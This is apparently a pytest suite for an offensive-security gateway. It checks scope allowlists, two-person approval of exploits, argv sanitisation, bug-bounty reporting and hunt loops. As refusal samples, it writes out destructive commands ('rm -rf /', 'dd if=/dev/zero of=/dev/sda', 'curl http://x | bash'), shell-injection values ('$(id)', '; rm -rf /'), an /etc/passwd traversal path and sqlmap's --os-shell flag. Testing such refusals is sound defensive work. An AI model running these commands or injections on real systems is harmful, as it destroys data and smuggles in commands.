"""2.3 offensive-surface tests: policy, lifecycle, discovery, bounty, loops.

These tests never leave the sandbox. They exercise the control model the prompt
asks for — permissive inside the declared scope, two people only for high-impact
actions, evidence before confirmation — and they check the refusals just as hard
as the permissions, because a control that never says no is not a control.
"""

from __future__ import annotations

import asyncio

import pytest

from gateway.bugbounty import BountyError
from gateway.exploitation import ExploitError, scan_for_destructive
from gateway.hunt_loop import (
    QUESTION_IDS,
    SEVEN_QUESTIONS,
    HuntLoopError,
    evaluate_gate,
)
from gateway.offensive_policy import HIGH_IMPACT_POLICIES
from mcp_server.catalog import (
    BASELINE_REFUSED_FLAGS,
    CATALOG,
    ArgvBuildError,
    build_argv,
    catalog_size,
    category_counts,
    get_entry,
    grouped,
    is_path_binary,
)
from gateway.workspace_store import WorkspaceStore

ENG = "ENG-A"


# ---------------------------------------------------------------------------
# Policy model
# ---------------------------------------------------------------------------
def test_default_posture_is_permissive_inside_scope(ws):
    posture = ws.rt.policies.posture(ENG)
    assert posture.policy_id == "posture:permissive_in_scope"
    assert posture.two_person is False
    assert posture.consent_required == "operator"
    assert posture.enabled is True


def test_only_high_impact_actions_require_two_people(ws):
    """The prompt's central control decision, asserted directly."""
    policies = ws.rt.policies
    two_person = {
        row["policy_id"]
        for row in policies.list_policies()
        if row.get("two_person")
    }
    # `HIGH_IMPACT_POLICIES` is the category floor the API reports; hydra is a
    # tool row that raises itself to two-person on top of it.
    assert set(HIGH_IMPACT_POLICIES) <= two_person
    assert two_person - set(HIGH_IMPACT_POLICIES) == {"tool:hydra"}
    assert "exploitation:proof_of_concept" in two_person
    assert "mass_scan:expanded_budget" in two_person
    assert "credential:post_exploitation" in two_person
    # Read-only and ordinary active testing are not two-person.
    assert "tool:nmap" in {r["policy_id"] for r in policies.list_policies()} 
    assert "tool:nmap" not in two_person


def test_high_impact_policies_are_not_enabled_by_posture_alone(ws):
    """A high-impact action stays blocked until its own consent exists."""
    decision = ws.rt.policies.evaluate_action(
        principal=ws.owner,
        engagement_id=ENG,
        action="exploitation:proof_of_concept",
        policy_id="exploitation:proof_of_concept",
    )
    assert decision.two_person_required is True
    assert decision.allowed is False
    assert decision.consent_met is False


def test_consent_digest_binds_to_the_exact_declaration(ws):
    policies = ws.rt.policies
    posture = policies.posture(ENG)
    policies.grant_consent(
        principal=ws.owner,
        level="operator",
        engagement_id=ENG,
        policy_id="posture:permissive_in_scope",
        statement=posture.declaration,
    )
    assert policies.has_consent(
        operator_id="owner", level="operator", engagement_id=ENG, policy=posture
    )
    # A different statement cannot satisfy the same policy.
    policies.grant_consent(
        principal=ws.peer,
        level="operator",
        engagement_id=ENG,
        policy_id="posture:permissive_in_scope",
        statement="I accept something else entirely, not the declared text.",
    )
    assert not policies.has_consent(
        operator_id="peer", level="operator", engagement_id=ENG, policy=posture
    )


def test_posture_never_widens_the_allowlist(ws):
    outside = ws.rt.scope.evaluate_target(ENG, "203.0.113.99", resolve_dns=False)
    assert outside.allowed is False
    metadata = ws.rt.scope.evaluate_target(ENG, "169.254.169.254", resolve_dns=False)
    assert metadata.allowed is False


def test_strict_posture_gates_active_actions(ws):
    ws.rt.policies.set_posture(ENG, "posture:strict_readonly", "admin")
    decision = ws.rt.policies.evaluate_action(
        principal=ws.admin, engagement_id=ENG, action="tool:nmap", tool_name="nmap"
    )
    assert decision.allowed is False
    assert decision.two_person_required is True


# ---------------------------------------------------------------------------
# Tool catalog and argv governance
# ---------------------------------------------------------------------------
def test_catalog_meets_the_prompt_tool_count():
    assert catalog_size() >= 105, "the prompt asks for 105-150+ tools"
    assert catalog_size() <= 200
    counts = category_counts()
    assert len(counts) >= 10
    assert sum(counts.values()) == catalog_size()
    assert len(grouped()) == len(counts)


def test_every_catalog_entry_is_addressable():
    for name, entry in CATALOG.items():
        assert name == entry.name
        assert entry.binary
        assert entry.description
        assert entry.default_risk in {"low", "medium", "high", "critical"}


def test_argv_is_a_vector_and_pins_the_target():
    argv = build_argv("nmap", "10.0.0.5", flags=["-sV"], allowed_flags=["-sV", "-T2"])
    assert argv == ["nmap", "-sV", "--", "10.0.0.5"]
    assert isinstance(argv, list)


def test_argv_refuses_flags_outside_the_policy_row():
    with pytest.raises(ArgvBuildError, match="not in this engagement"):
        build_argv("nmap", "10.0.0.5", flags=["-T4"], allowed_flags=["-sV"])


def test_argv_refusal_floor_survives_a_permissive_policy():
    """Even a policy row that lists --os-shell cannot reach it."""
    with pytest.raises(ArgvBuildError, match="refused by policy"):
        build_argv(
            "sqlmap", "10.0.0.5", flags=["--os-shell"], allowed_flags=["--os-shell"]
        )
    assert "--os-shell" in BASELINE_REFUSED_FLAGS["sqlmap"]


def test_argv_refuses_shell_metacharacters_and_leading_dashes():
    with pytest.raises(ArgvBuildError):
        build_argv("nmap", "10.0.0.5; rm -rf /", flags=["-sV"], allowed_flags=["-sV"])
    with pytest.raises(ArgvBuildError):
        build_argv("nmap", "--script=evil", flags=["-sV"], allowed_flags=["-sV"])


def test_argv_rejects_injected_token_structure():
    with pytest.raises(ArgvBuildError):
        build_argv("nmap", "10.0.0.5", flags=["-sV $(id)"], allowed_flags=["-sV $(id)"])


def test_python_library_entries_are_not_reported_as_installed_binaries():
    assert get_entry("pwntools") is not None
    assert is_path_binary(get_entry("pwntools")) is False
    assert is_path_binary(get_entry("elf_info")) is False
    assert is_path_binary(get_entry("readelf")) is True


def test_installed_tools_is_an_honest_subset(ws):
    installed = ws.rt.runner.installed_tools()
    assert set(installed) <= set(CATALOG)
    assert "nmap" not in installed or installed["nmap"].endswith("nmap")
    assert all(is_path_binary(CATALOG[name]) for name in installed)


# ---------------------------------------------------------------------------
# Exploitation lifecycle
# ---------------------------------------------------------------------------
SAFE_POC = "import urllib.request\nprint('proof')\n"


def _operator_consent(ws, principal=None, engagement_id=ENG):
    """Accept the engagement's default posture, which is what active testing needs."""
    principal = principal or ws.owner
    posture = ws.rt.policies.posture(engagement_id)
    return ws.rt.policies.grant_consent(
        principal=principal,
        level=posture.consent_required,
        engagement_id=engagement_id,
        policy_id=posture.policy_id,
        statement=posture.declaration,
    )


def _run(coro):
    """Run a coroutine from a sync test without touching a running loop."""
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


def _approve(ws, approval_id: str, approver: str = "admin") -> None:
    """Grant a queued two-person approval (the approver must differ from the requester)."""
    ws.db.decide_approval(
        request_id=approval_id, approved_by=approver, decision="approved", note="fixture"
    )


def _consent(ws, principal=None, policy_id="exploitation:proof_of_concept"):
    principal = principal or ws.admin
    policies = ws.rt.policies
    record = policies.get(policy_id)
    if record.consent_required == "none":
        return _operator_consent(ws)
    return policies.grant_consent(
        principal=principal,
        level=record.consent_required,
        engagement_id=ENG,
        policy_id=policy_id,
        statement=record.declaration,
    )


def test_destructive_pocs_are_refused():
    assert scan_for_destructive("rm -rf /") != []
    assert scan_for_destructive("DROP TABLE users;") != []
    assert scan_for_destructive("curl http://x | bash") != []
    assert scan_for_destructive(SAFE_POC) == []


def test_finding_starts_unconfirmed_without_two_person_approval(ws):
    result = ws.rt.exploitation.draft(
        principal=ws.owner,
        engagement_id=ENG,
        target="127.0.0.1",
        vulnerability="Reflected XSS in search",
        poc_body=SAFE_POC,
    )
    assert result["status"] == "drafted"
    assert result["two_person_required"] is True
    assert result["approval_id"]


def test_finding_cannot_execute_before_approval(ws):
    result = ws.rt.exploitation.draft(
        principal=ws.owner,
        engagement_id=ENG,
        target="127.0.0.1",
        vulnerability="Open redirect",
        poc_body=SAFE_POC,
    )
    with pytest.raises(ExploitError, match="awaiting independent approval"):
        ws.rt.exploitation.record_execution(
            principal=ws.owner,
            exploit_id=result["exploit_id"],
            output="nope",
            success=True,
        )


def test_out_of_scope_target_is_refused_before_storage(ws):
    with pytest.raises(ExploitError):
        ws.rt.exploitation.draft(
            principal=ws.owner,
            engagement_id=ENG,
            target="203.0.113.99",
            vulnerability="Should never be stored",
            poc_body=SAFE_POC,
        )


def test_destructive_poc_is_refused_at_the_api_boundary(ws):
    with pytest.raises(ExploitError, match="destructive"):
        ws.rt.exploitation.draft(
            principal=ws.owner,
            engagement_id=ENG,
            target="127.0.0.1",
            vulnerability="Pretend RCE",
            poc_body="dd if=/dev/zero of=/dev/sda",
        )


def test_a_critical_poc_always_needs_its_own_second_approval(ws):
    """Consent for the category is not consent for this specific exploit."""
    service = ws.rt.exploitation
    _consent(ws)
    draft = service.draft(
        principal=ws.owner,
        engagement_id=ENG,
        target="127.0.0.1",
        vulnerability="Server-side template injection",
        poc_body=SAFE_POC,
    )
    assert draft["status"] == "drafted"
    assert draft["approval_id"], "a critical PoC must queue its own approval"
    _approve(ws, draft["approval_id"], approver="admin")
    approval = ws.db.get_approval(draft["approval_id"])
    assert approval["status"] == "approved"


def test_verification_requires_a_different_operator_and_matching_output(ws):
    service = ws.rt.exploitation
    _consent(ws)
    draft = service.draft(
        principal=ws.owner,
        engagement_id=ENG,
        target="127.0.0.1",
        vulnerability="Verbose error discloses stack trace",
        poc_body=SAFE_POC,
        language="python",
        severity="medium",
    )
    _approve(ws, draft["approval_id"])
    service.record_execution(
        principal=ws.owner, exploit_id=draft["exploit_id"], output="HTTP/1.1 500 ID", success=True
    )
    # The author cannot verify their own finding.
    with pytest.raises(ExploitError, match="different operator"):
        service.verify(
            principal=ws.owner,
            exploit_id=draft["exploit_id"],
            reproduced_output="HTTP/1.1 500 ID",
        )
    # A mismatching reproduction demotes rather than confirms.
    with pytest.raises(ExploitError, match="does not match"):
        service.verify(
            principal=ws.peer,
            exploit_id=draft["exploit_id"],
            reproduced_output="HTTP/1.1 200 OK",
        )
    findings = service.list_findings(engagement_id=ENG)
    assert findings[0]["status"] == "unverified"


def test_full_lifecycle_reaches_verified(ws):
    service = ws.rt.exploitation
    _consent(ws)
    draft = service.draft(
        principal=ws.owner,
        engagement_id=ENG,
        target="127.0.0.1",
        vulnerability="Missing security headers on admin path",
        poc_body=SAFE_POC,
        severity="low",
    )
    _approve(ws, draft["approval_id"])
    service.record_execution(
        principal=ws.owner, exploit_id=draft["exploit_id"], output="reproducible-output", success=True
    )
    verified = service.verify(
        principal=ws.peer, exploit_id=draft["exploit_id"], reproduced_output="reproducible-output"
    )
    assert verified["status"] == "verified"
    assert service.evidence_summary(ENG)["confirmed"] == 1
    # Only verified findings are externally claimable.
    confirmed = service.confirmed_findings(ENG)
    assert [f["exploit_id"] for f in confirmed] == [draft["exploit_id"]]


def test_stored_poc_body_cannot_be_edited(ws):
    service = ws.rt.exploitation
    _consent(ws)
    draft = service.draft(
        principal=ws.owner,
        engagement_id=ENG,
        target="127.0.0.1",
        vulnerability="Immutable PoC check",
        poc_body=SAFE_POC,
    )
    with pytest.raises(Exception, match="immutable"):
        with ws.db.connection() as conn:
            conn.execute(
                "UPDATE exploitation_evidence SET poc_body='x', poc_sha256=? WHERE exploit_id=?",
                ("0" * 64, draft["exploit_id"]),
            )


def test_attack_chain_requires_verified_findings(ws):
    service = ws.rt.exploitation
    _consent(ws)
    with pytest.raises(ExploitError, match="verified findings"):
        service.propose_chain(
            principal=ws.owner,
            engagement_id=ENG,
            step_ids=["exp-aaaaaaaaaaaa", "exp-bbbbbbbbbbbb"],
            rationale="Should not be possible without evidence.",
        )


def test_attack_chain_names_the_weakest_link(ws):
    service = ws.rt.exploitation
    _consent(ws)
    ids = []
    for name, severity in (("Weak info leak", "low"), ("Privilege gap", "high")):
        draft = service.draft(
            principal=ws.owner,
            engagement_id=ENG,
            target="127.0.0.1",
            vulnerability=name,
            poc_body=SAFE_POC,
            severity=severity,
        )
        _approve(ws, draft["approval_id"])
        service.record_execution(
            principal=ws.owner, exploit_id=draft["exploit_id"], output=f"out-{name}", success=True
        )
        service.verify(
            principal=ws.peer,
            exploit_id=draft["exploit_id"],
            reproduced_output=f"out-{name}",
        )
        ids.append(draft["exploit_id"])
    chain = service.propose_chain(
        principal=ws.owner,
        engagement_id=ENG,
        step_ids=ids,
        rationale="Chain the info leak into the privilege gap.",
    )
    assert chain["weakest_link"].startswith("Weak info leak")


# ---------------------------------------------------------------------------
# Recursive discovery and mass-scan budgets
# ---------------------------------------------------------------------------
def test_discovery_classifies_without_widening_scope(ws):
    result = ws.rt.exploration.discover(
        principal=ws.owner,
        engagement_id=ENG,
        candidates=["127.0.0.1", "203.0.113.99", "evil; rm -rf /"],
    )
    assert "127.0.0.1" in result.in_scope
    assert "203.0.113.99" in result.out_of_scope
    assert result.rejected, "a malformed candidate must be reported, not ignored"
    # Discovery on its own never adds anything to the allowlist.
    allowlist = {e["target"] for e in ws.db.list_allowlist(engagement_id=ENG, active_only=True)}
    assert "203.0.113.99" not in allowlist


def test_mass_scan_without_authorisation_is_pending(ws):
    result = ws.rt.exploration.request_mass_scan(
        principal=ws.owner,
        engagement_id=ENG,
        mission_id=None,
        target_count=64,
        request_count=5000,
        justification="Whole /22 range is in the signed scope.",
    )
    assert result["status"] == "pending_approval"
    assert result["approval_id"].startswith("apr-")


def test_scan_budget_is_enforced_not_just_declared(ws):
    policies = ws.rt.policies
    decision = policies.check_scan_budget(
        engagement_id=ENG, requested_hosts=10, requested_requests=100
    )
    assert decision["allowed"] is False
    assert "authorisation" in decision["reason"]

    auth = policies.grant_scan_authorization(
        engagement_id=ENG,
        mission_id=None,
        approval_id=_approved_mass_scan(ws),
        granted_by="admin",
        granted_to="owner",
        max_hosts=16,
        max_requests=500,
    )
    assert policies.check_scan_budget(
        engagement_id=ENG, requested_hosts=10, requested_requests=100
    )["allowed"] is True
    # Over the host cap is still refused.
    assert policies.check_scan_budget(
        engagement_id=ENG, requested_hosts=99, requested_requests=100
    )["allowed"] is False
    # And the budget actually depletes.
    ws.db.consume_scan_budget(auth["authorization_id"], 450)
    assert policies.check_scan_budget(
        engagement_id=ENG, requested_hosts=10, requested_requests=100
    )["allowed"] is False


def _approved_mass_scan(ws) -> str:
    approval = ws.db.enqueue_approval(
        engagement_id=ENG,
        request_type="mass_scan",
        target=ENG,
        tool_or_script="mass_scan:expanded_budget",
        payload={"justification": "test"},
        requested_by="owner",
    )
    ws.db.decide_approval(
        request_id=approval["request_id"],
        approved_by="admin",
        decision="approved",
        note="fixture",
    )
    return approval["request_id"]


def test_secondary_targets_only_suggest_in_scope_assets(ws):
    with ws.db.connection() as conn:
        WorkspaceStore._asset(conn, ENG, "ip", "127.0.0.1", "127.0.0.1")
        WorkspaceStore._asset(conn, ENG, "domain", "stale.example", "stale.example")
    result = ws.rt.exploration.derive_secondary_targets(ENG)
    assert "127.0.0.1" in {item["host"] for item in result["in_scope_targets"]}
    # An asset row does not make something testable; the allowlist still decides.
    assert "stale.example" in {item["host"] for item in result["no_longer_in_scope"]}


# ---------------------------------------------------------------------------
# Bug bounty honesty
# ---------------------------------------------------------------------------
def test_manual_scope_is_labelled_manual_not_synced(ws):
    program = ws.rt.bounty.register_program(
        principal=ws.owner,
        engagement_id=ENG,
        platform="hackerone",
        handle="example-program",
        scope_entries=["127.0.0.1", {"asset": "unit.lab.example", "kind": "host"}],
    )
    assert program["source"] == "manual"
    assert program["last_synced_at"] is None
    assert program["sync_error"], "an un-synced scope must say so"


def test_sync_without_credentials_degrades_honestly(ws, monkeypatch):
    monkeypatch.delenv("HACKERONE_API_USERNAME", raising=False)
    monkeypatch.delenv("HACKERONE_API_TOKEN", raising=False)
    program = ws.rt.bounty.register_program(
        principal=ws.owner,
        engagement_id=ENG,
        platform="hackerone",
        handle="no-creds-program",
        scope_entries=["127.0.0.1"],
    )
    outcome = ws.rt.bounty.sync_program(principal=ws.owner, program_id=program["program_id"])
    assert outcome["status"] == "unavailable"
    assert outcome["source"] == "manual"
    assert "credentials" in outcome["detail"]
    assert ws.rt.bounty.get_program(program["program_id"])["last_synced_at"] is None


def test_duplicate_check_is_unverified_without_a_platform_query(ws):
    program = ws.rt.bounty.register_program(
        principal=ws.owner,
        engagement_id=ENG,
        platform="manual",
        handle="local-program",
        scope_entries=["127.0.0.1"],
    )
    result = ws.rt.bounty.check_duplicates(
        principal=ws.owner,
        program_id=program["program_id"],
        finding_key="exp-000000000001",
        endpoint="/search",
    )
    assert result["outcome"] == "unverified"
    assert "not that the finding is unique" in result["note"]


def test_report_draft_refuses_unverified_findings(ws):
    with pytest.raises(BountyError, match="independently verified"):
        ws.rt.bounty.draft_report(
            principal=ws.owner,
            engagement_id=ENG,
            finding={
                "exploit_id": "exp-x",
                "status": "drafted",
                "vulnerability": "x",
                "target": "127.0.0.1",
                "severity": "high",
                "poc_sha256": "0" * 64,
            },
        )


def test_report_body_carries_the_evidence_digests(ws):
    service = ws.rt.exploitation
    _consent(ws)
    draft = service.draft(
        principal=ws.owner,
        engagement_id=ENG,
        target="127.0.0.1",
        vulnerability="Reported finding",
        poc_body=SAFE_POC,
        severity="medium",
    )
    _approve(ws, draft["approval_id"])
    service.record_execution(
        principal=ws.owner, exploit_id=draft["exploit_id"], output="evidence-output", success=True
    )
    service.verify(
        principal=ws.peer, exploit_id=draft["exploit_id"], reproduced_output="evidence-output"
    )
    finding = service.list_findings(engagement_id=ENG)[0]
    report = ws.rt.bounty.draft_report(
        principal=ws.owner,
        engagement_id=ENG,
        finding=finding,
        impact="An attacker can read the admin path without authentication.",
        remediation="Require authentication and ship the missing headers.",
    )
    body = ws.rt.bounty.get_report(report["report_id"])["body_markdown"]
    assert finding["poc_sha256"] in body
    assert "PoC SHA-256" in body
    assert "Steps to reproduce" in body


def test_report_rejects_unknown_foreign_keys_with_a_reason(ws):
    """A bogus check id must be a validation error, not a 500."""
    service = ws.rt.exploitation
    _consent(ws)
    draft = service.draft(
        principal=ws.owner,
        engagement_id=ENG,
        target="127.0.0.1",
        vulnerability="FK validation finding",
        poc_body=SAFE_POC,
    )
    _approve(ws, draft["approval_id"])
    service.record_execution(
        principal=ws.owner, exploit_id=draft["exploit_id"], output="o", success=True
    )
    service.verify(principal=ws.peer, exploit_id=draft["exploit_id"], reproduced_output="o")
    finding = service.list_findings(engagement_id=ENG)[0]
    with pytest.raises(BountyError, match="Unknown duplicate check"):
        ws.rt.bounty.draft_report(
            principal=ws.owner,
            engagement_id=ENG,
            finding=finding,
            check_id="dup-doesnotexist",
        )
    with pytest.raises(BountyError, match="Unknown program"):
        ws.rt.bounty.draft_report(
            principal=ws.owner,
            engagement_id=ENG,
            finding=finding,
            program_id="bbp-doesnotexist",
        )


def test_report_cannot_be_marked_ready_with_an_unverified_dup_check(ws):
    service = ws.rt.exploitation
    _consent(ws)
    draft = service.draft(
        principal=ws.owner,
        engagement_id=ENG,
        target="127.0.0.1",
        vulnerability="Ready-gate finding",
        poc_body=SAFE_POC,
    )
    _approve(ws, draft["approval_id"])
    service.record_execution(
        principal=ws.owner, exploit_id=draft["exploit_id"], output="out", success=True
    )
    service.verify(principal=ws.peer, exploit_id=draft["exploit_id"], reproduced_output="out")
    finding = service.list_findings(engagement_id=ENG)[0]
    program = ws.rt.bounty.register_program(
        principal=ws.owner,
        engagement_id=ENG,
        platform="manual",
        handle="ready-check",
        scope_entries=["127.0.0.1"],
    )
    dup = ws.rt.bounty.check_duplicates(
        principal=ws.owner,
        program_id=program["program_id"],
        finding_key=finding["exploit_id"],
    )
    report = ws.rt.bounty.draft_report(
        principal=ws.owner,
        engagement_id=ENG,
        finding=finding,
        program_id=program["program_id"],
        check_id=dup["check_id"],
    )
    with pytest.raises(BountyError, match="unverified"):
        ws.rt.bounty.mark_ready(principal=ws.owner, report_id=report["report_id"])


# ---------------------------------------------------------------------------
# pwntools layer
# ---------------------------------------------------------------------------
def test_pwntools_reports_unavailable_rather_than_faking_output(ws):
    status = ws.rt.pwntools.availability(refresh=True)
    if status["available"]:
        pytest.skip("pwntools is installed in this environment")
    assert status["available"] is False
    assert "pwntools" in status["detail"]


def test_pwntools_job_is_recorded_even_when_unavailable(ws):
    _operator_consent(ws)
    result = ws.rt.pwntools.run(
        principal=ws.owner,
        engagement_id=ENG,
        action="cyclic",
        length=64,
    )
    assert result["status"] in {"unavailable", "completed"}
    assert result["layer"] == "pwntools"
    record = ws.rt.pwntools.get_job(result["job_id"])
    assert record["status"] == result["status"]


def test_pwntools_refuses_scripts_outside_the_artifact_root(ws):
    with pytest.raises(Exception, match="escapes the configured root"):
        ws.rt.pwntools.run(
            principal=ws.owner,
            engagement_id=ENG,
            action="checksec",
            artifact_path="../../etc/passwd",
        )


def test_pwntools_refuses_a_destructive_script(ws):
    _operator_consent(ws)
    with pytest.raises(Exception, match="destructive"):
        ws.rt.pwntools.run(
            principal=ws.owner,
            engagement_id=ENG,
            action="run_script",
            script="import os\nos.system('rm -rf /')\n",
        )


# ---------------------------------------------------------------------------
# Hunt loops, the 7-Question Gate and the brain
# ---------------------------------------------------------------------------
def test_gate_blocks_until_every_question_is_answered_yes():
    assert evaluate_gate({}).passed is False
    partial = {qid: "yes" for qid in QUESTION_IDS[:-1]}
    result = evaluate_gate(partial)
    assert result.passed is False
    assert result.unanswered == [QUESTION_IDS[-1]]
    assert evaluate_gate({qid: "yes" for qid in QUESTION_IDS}).passed is True


def test_gate_treats_unknown_as_blocking_and_blast_radius_first():
    answers = {qid: "yes" for qid in QUESTION_IDS}
    answers["q2_in_scope"] = "unknown"
    answers["q7_blast_radius"] = "no"
    result = evaluate_gate(answers)
    assert result.passed is False
    assert result.blocking[0]["question_id"] == "q7_blast_radius"
    assert {b["question_id"] for b in result.blocking} == {"q2_in_scope", "q7_blast_radius"}


def test_seven_questions_are_declared_exactly():
    assert len(SEVEN_QUESTIONS) == 7
    assert [q["id"] for q in SEVEN_QUESTIONS] == list(QUESTION_IDS)
    assert all(q["blocks"] for q in SEVEN_QUESTIONS)


def test_hunt_loop_can_lose_and_the_loss_is_remembered(ws):
    loops = ws.rt.loops
    loop = loops.open_loop(
        principal=ws.owner,
        engagement_id=ENG,
        role_id="http-hardening-hunter",
        hypothesis="The admin path omits HSTS and CSP entirely.",
    )
    assert loop["status"] == "open"
    loops.iterate(principal=ws.owner, loop_id=loop["loop_id"], note="Probed the path: headers present.")
    killed = loops.kill_loop(
        principal=ws.owner,
        loop_id=loop["loop_id"],
        reason="Headers were present on a second host; hypothesis falsified.",
    )
    assert killed["status"] == "killed"
    summary = loops.brain_summary(ENG)
    assert summary["loops_by_status"]["killed"] == 1
    assert any("falsified" in lesson["content"] for lesson in summary["recent_lessons"])


def test_hunt_loop_needs_a_testable_hypothesis(ws):
    with pytest.raises(HuntLoopError):
        ws.rt.loops.open_loop(
            principal=ws.owner,
            engagement_id=ENG,
            role_id="http-hardening-hunter",
            hypothesis="xss",
        )


def test_iteration_budget_is_finite(ws):
    loop = ws.rt.loops.open_loop(
        principal=ws.owner,
        engagement_id=ENG,
        role_id="http-hardening-hunter",
        hypothesis="Repeated probing might reveal a timing side channel.",
        max_iterations=2,
    )
    ws.rt.loops.iterate(principal=ws.owner, loop_id=loop["loop_id"], note="first")
    ws.rt.loops.iterate(principal=ws.owner, loop_id=loop["loop_id"], note="second")
    with pytest.raises(HuntLoopError, match="iteration budget"):
        ws.rt.loops.iterate(principal=ws.owner, loop_id=loop["loop_id"], note="third")


def test_brain_is_append_only(ws):
    entry = ws.rt.loops.append_brain(
        principal=ws.owner, engagement_id=ENG, kind="note", content="Remembered fact."
    )
    with pytest.raises(Exception, match="append-only"):
        with ws.db.connection() as conn:
            conn.execute("UPDATE brain_entries SET content='tampered' WHERE entry_id=?", (entry["entry_id"],))
    with pytest.raises(Exception, match="append-only"):
        with ws.db.connection() as conn:
            conn.execute("DELETE FROM brain_entries WHERE entry_id=?", (entry["entry_id"],))


def test_gate_result_is_written_to_the_brain(ws):
    loops = ws.rt.loops
    loop = loops.open_loop(
        principal=ws.owner,
        engagement_id=ENG,
        role_id="evidence-validator",
        hypothesis="The redirect can be turned into a full response split.",
    )
    blocked = loops.apply_gate(
        principal=ws.owner,
        loop_id=loop["loop_id"],
        answers={"q2_in_scope": "yes"},
    )
    assert blocked["status"] == "blocked"
    kinds = {entry["kind"] for entry in loops.recall(ENG)}
    assert {"hypothesis", "question", "verdict"} <= kinds


def test_roster_is_inside_the_prompt_range(ws):
    # 2.3 shipped 49 roles; 2.3.1 added 21 hunting/review roles for the surfaces the
    # referenced rosters cover. The bound moves with the roster, and every added
    # role must still be advisory (asserted below).
    roster = ws.rt.loops.roster()
    assert 70 <= roster["count"] <= 80
    assert len(roster["phases"]) >= 8
    assert all(role["can_execute"] is False for role in roster["roles"])
    assert all(role["can_approve"] is False for role in roster["roles"])


# ---------------------------------------------------------------------------
# HTTP surface
# ---------------------------------------------------------------------------
async def test_policy_endpoint_reports_the_control_model(ws):
    response = await ws.client.get(
        f"/api/v1/offensive/policy?engagement_id={ENG}", headers=ws.headers["owner"]
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["control_model"]["default_posture"] == "posture:permissive_in_scope"
    assert "exploitation:proof_of_concept" in body["control_model"]["two_person_only_for"]
    assert body["active_posture"] == "posture:permissive_in_scope"
    # High-impact rows are stored under their own policy_type; the API must still
    # surface them, otherwise the control model is documented but not inspectable.
    assert {row["policy_id"] for row in body["policies"]} >= set(HIGH_IMPACT_POLICIES)
    assert all(row["policy_id"].startswith("tool:") for row in body["tools"])


async def test_tools_endpoint_separates_catalog_from_installed(ws):
    response = await ws.client.get("/api/v1/offensive/tools", headers=ws.headers["owner"])
    assert response.status_code == 200
    body = response.json()
    assert body["count"] >= 105
    assert isinstance(body["installed_on_this_image"], dict)
    assert "note" in body


async def test_tool_run_requires_scope_even_with_consent(ws):
    _operator_consent(ws)
    response = await ws.client.post(
        "/api/v1/offensive/tools/run",
        headers=ws.headers["owner"],
        json={
            "engagement_id": ENG,
            "tool": "nmap",
            "target": "203.0.113.99",
            "flags": ["-sV"],
        },
    )
    assert response.status_code == 422
    assert "allowlist" in response.json()["detail"].lower()


async def test_tool_run_reports_unavailable_binary_honestly(ws):
    _operator_consent(ws)
    response = await ws.client.post(
        "/api/v1/offensive/tools/run",
        headers=ws.headers["owner"],
        json={"engagement_id": ENG, "tool": "nmap", "target": "127.0.0.1", "flags": ["-sV"]},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    if body["status"] == "unavailable":
        assert body["argv"][0] == "nmap"
        assert "not installed" in body["stderr"]
    else:
        assert body["status"] in {"completed", "failed"}


async def test_finding_endpoint_enforces_the_lifecycle(ws):
    response = await ws.client.post(
        "/api/v1/offensive/findings",
        headers=ws.headers["owner"],
        json={
            "engagement_id": ENG,
            "target": "127.0.0.1",
            "vulnerability": "API lifecycle check",
            "poc_body": SAFE_POC,
        },
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["status"] == "drafted"
    assert body["two_person_required"] is True

    listed = await ws.client.get(
        f"/api/v1/offensive/findings?engagement_id={ENG}", headers=ws.headers["owner"]
    )
    assert listed.status_code == 200
    assert listed.json()["summary"]["confirmed"] == 0


async def test_finding_endpoint_refuses_out_of_scope_target(ws):
    response = await ws.client.post(
        "/api/v1/offensive/findings",
        headers=ws.headers["owner"],
        json={
            "engagement_id": ENG,
            "target": "203.0.113.99",
            "vulnerability": "Out of scope",
            "poc_body": SAFE_POC,
        },
    )
    assert response.status_code == 422


async def test_outsider_cannot_read_another_engagements_findings(ws):
    response = await ws.client.get(
        f"/api/v1/offensive/findings?engagement_id={ENG}", headers=ws.headers["outsider"]
    )
    assert response.status_code == 403


async def test_posture_change_requires_an_approver(ws):
    response = await ws.client.post(
        "/api/v1/offensive/posture",
        headers=ws.headers["owner"],
        json={"engagement_id": ENG, "posture_id": "posture:ctf_aggressive"},
    )
    assert response.status_code == 403
    ok = await ws.client.post(
        "/api/v1/offensive/posture",
        headers=ws.headers["admin"],
        json={"engagement_id": ENG, "posture_id": "posture:ctf_aggressive"},
    )
    assert ok.status_code == 200
    assert ws.rt.policies.posture(ENG).policy_id == "posture:ctf_aggressive"


async def test_brief_answers_the_session_start_protocol(ws):
    response = await ws.client.get(
        f"/api/v1/offensive/brief?engagement_id={ENG}", headers=ws.headers["owner"]
    )
    assert response.status_code == 200
    body = response.json()
    # The five things the prompt requires a session to state, in order.
    assert "mission" in body
    assert "scope" in body and body["scope"]["allowlist_entries"] >= 3
    assert "roe" in body and body["roe"]["posture"] == "posture:permissive_in_scope"
    assert body["tls"]["mandatory"] is True
    layers = {layer["id"]: layer for layer in body["capability_layers"]}
    assert {"tool_execution", "agents", "pwntools"} <= set(layers)
    assert body["restrictions"]["two_person_high_impact_only"] is True


async def test_brief_reports_pending_tls_as_pending(ws):
    response = await ws.client.get(
        f"/api/v1/offensive/brief?engagement_id={ENG}", headers=ws.headers["owner"]
    )
    body = response.json()
    assert body["tls"]["completed"] is False
    assert body["tls"]["pending"] is True


async def test_pwntools_status_endpoint_is_honest(ws):
    response = await ws.client.get(
        "/api/v1/offensive/pwntools/status?refresh=true", headers=ws.headers["owner"]
    )
    assert response.status_code == 200
    body = response.json()
    assert body["layer"] == "pwntools"
    assert "available" in body
    assert body["fallback"]


async def test_loop_endpoints_round_trip(ws):
    created = await ws.client.post(
        "/api/v1/offensive/loops",
        headers=ws.headers["owner"],
        json={
            "engagement_id": ENG,
            "role_id": "devils-advocate",
            "hypothesis": "The retest will show the header regression persisted.",
        },
    )
    assert created.status_code == 200, created.text
    loop_id = created.json()["loop_id"]

    gated = await ws.client.post(
        f"/api/v1/offensive/loops/{loop_id}/gate",
        headers=ws.headers["owner"],
        json={"answers": {qid: "yes" for qid in QUESTION_IDS}},
    )
    assert gated.status_code == 200
    assert gated.json()["status"] == "advanced"

    brain = await ws.client.get(
        f"/api/v1/offensive/brain?engagement_id={ENG}", headers=ws.headers["owner"]
    )
    assert brain.status_code == 200
    assert brain.json()["entries"]


async def test_uploaded_script_and_tool_flags_are_validated_by_the_api(ws):
